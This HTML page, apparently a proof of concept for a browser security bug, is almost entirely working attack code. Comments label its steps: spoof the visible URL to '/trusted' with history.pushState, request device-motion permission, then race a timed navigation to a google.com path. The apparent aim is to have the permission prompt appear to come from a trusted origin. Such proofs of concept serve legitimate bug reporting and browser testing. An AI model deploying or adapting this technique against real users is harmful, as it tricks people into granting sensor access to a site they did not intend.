<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Motion Feature</title>
<meta name="viewport" content="width=device-width, initial-scale=1">

<style>
body {
  margin: 0;
  font-family: -apple-system, BlinkMacSystemFont, system-ui;
  background: #f5f5f7;
}

button {
  font-size: 15px;
  padding: 10px 14px;
  border-radius: 10px;
  border: none;
  background: #007aff;
  color: #fff;
}

#panel {
  display: none;
  max-width: 420px;
  margin: 80px auto;
  background: #fff;
  padding: 24px;
  border-radius: 16px;
  box-shadow: 0 20px 60px rgba(0,0,0,.2);
  text-align: center;
}
</style>
</head>

<body>

<div style="text-align:center; margin-top:60px;">
  <button id="trigger">Start Feature</button>
</div>

<div id="panel">
  <h2>Enable Motion</h2>
  <p>This feature uses device motion sensors.</p>
  <button onclick="requestMotion()">Enable Motion</button>
</div>

<script>
const panel   = document.getElementById('panel');
const trigger = document.getElementById('trigger');
let motionStarted = false;

function requestMotion() {
  if (typeof DeviceMotionEvent?.requestPermission === 'function') {
    motionStarted = true;
    DeviceMotionEvent.requestPermission();
  }
}

/*
 * Step 1:
 * Manipulate visible URL to a trusted-looking path
 */
trigger.onclick = () => {
  history.pushState({}, '', '/trusted');
  panel.style.display = 'block';
};

/*
 * Step 2:
 * Trigger a navigation race shortly after permission flow starts
 */
window.addEventListener('pageshow', () => {
  if (!motionStarted) return;

  requestAnimationFrame(() => {
    requestAnimationFrame(() => {
      setTimeout(() => {
        location.href = 'https://google.com/motion.html';
      }, 80);
    });
  });
});
</script>

</body>
</html>
